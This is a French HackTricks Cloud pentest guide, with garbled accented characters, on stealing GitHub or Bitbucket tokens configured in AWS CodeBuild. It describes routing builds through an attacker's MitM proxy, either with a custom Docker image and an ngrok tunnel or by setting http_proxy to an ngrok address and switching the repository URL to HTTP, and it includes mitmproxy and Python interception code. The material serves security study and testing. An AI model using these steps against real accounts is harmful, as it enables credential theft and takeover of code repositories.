# AWS Codebuild - Fuite de jetons

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **d√©p√¥ts Github.**

</details>

## R√©cup√©rer les jetons configur√©s pour Github/Bitbucket

### Via l'image Docker

Si vous constatez que l'authentification pour Github est configur√©e dans le compte, vous pouvez **exfiltrer** cet **acc√®s** (**jeton GH ou jeton OAuth**) en faisant en sorte que Codebuild utilise une **image Docker sp√©cifique** pour ex√©cuter la construction du projet.

√Ä cette fin, vous pouvez **cr√©er un nouveau projet Codebuild** ou modifier l'**environnement** d'un projet existant pour d√©finir l'**image Docker**.

L'image Docker que vous pouvez utiliser est [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Il s'agit d'une image Docker tr√®s basique qui d√©finira les variables d'environnement `https_proxy`, `http_proxy` et `SSL_CERT_FILE`. Cela vous permettra d'intercepter la plupart du trafic de l'h√¥te indiqu√© dans `https_proxy` et `http_proxy` et de faire confiance au CERT SSL indiqu√© dans `SSL_CERT_FILE`.

1. **Cr√©ez et t√©l√©chargez votre propre image Docker MitM**
   * Suivez les instructions du d√©p√¥t pour d√©finir l'adresse IP de votre proxy et d√©finir votre certificat SSL et **construisez l'image Docker**.
     * **NE D√âFINISSEZ PAS `http_proxy`** pour ne pas intercepter les demandes vers le point de terminaison de m√©tadonn√©es.
   * Vous pouvez utiliser **`ngrok`** comme `ngrok tcp 4444` pour d√©finir le proxy vers votre h√¥te.
   * Une fois que vous avez construit l'image Docker, **t√©l√©chargez-la dans un d√©p√¥t public** (Dockerhub, ECR...)
2. **D√©finissez l'environnement**
   * Cr√©ez un **nouveau projet Codebuild** ou **modifiez** l'environnement d'un projet existant.
   * D√©finissez le projet pour utiliser l'**image Docker g√©n√©r√©e pr√©c√©demment**
   *

       <figure><img src="../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
3. **D√©finissez le proxy MitM sur votre h√¥te**
   * Comme indiqu√© dans le **d√©p√¥t Github**, vous pouvez utiliser quelque chose comme : `mitmproxy --listen-port 4444 --set block_global=false --allow-hosts "github.com"`
4. **Ex√©cutez la construction et capturez les informations d'identification**
   * Vous pouvez voir le jeton dans l'en-t√™te Authorization :

       <figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### Via le protocole HTTP

{% hint style="success" %}
**Cette vuln√©rabilit√© a √©t√© corrig√©e par AWS √† un moment donn√© la semaine du 20 f√©vrier 2023 (je pense le vendredi). Ainsi, un attaquant ne peut plus l'exploiter :)**
{% endhint %}

Un attaquant disposant de **permissions √©lev√©es sur un CodeBuild pourrait divulguer le jeton Github/Bitbucket** configur√© ou, si les autorisations ont √©t√© configur√©es via OAuth, le **jeton OAuth temporaire utilis√© pour acc√©der au code**.

* Un attaquant pourrait ajouter les variables d'environnement **http\_proxy** et **https\_proxy** au projet CodeBuild en pointant vers sa machine (par exemple `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

* Ensuite, changez l'URL du d√©p√¥t Github pour utiliser HTTP au lieu de HTTPS, par exemple : **http://**github.com/carlospolop-forks/TestActions
* Ensuite, ex√©cutez l'exemple de base de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) sur le port indiqu√© par les variables de proxy (http\_proxy et https\_proxy)

```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
    host="127.0.0.1",
    port=4444,
    protocols=[protocol.HTTP], 
    middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
    certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```

* Enfin, cliquez sur **Construire le projet**, les **informations d'identification** seront **envoy√©es en clair** (base64) sur le port mitm :

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Maintenant, un attaquant pourra utiliser le jeton depuis sa machine, lister tous les privil√®ges qu'il poss√®de et (ab)user plus facilement que s'il utilisait directement le service CodeBuild.
{% endhint %}

<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **d√©p√¥ts Github.**

</details>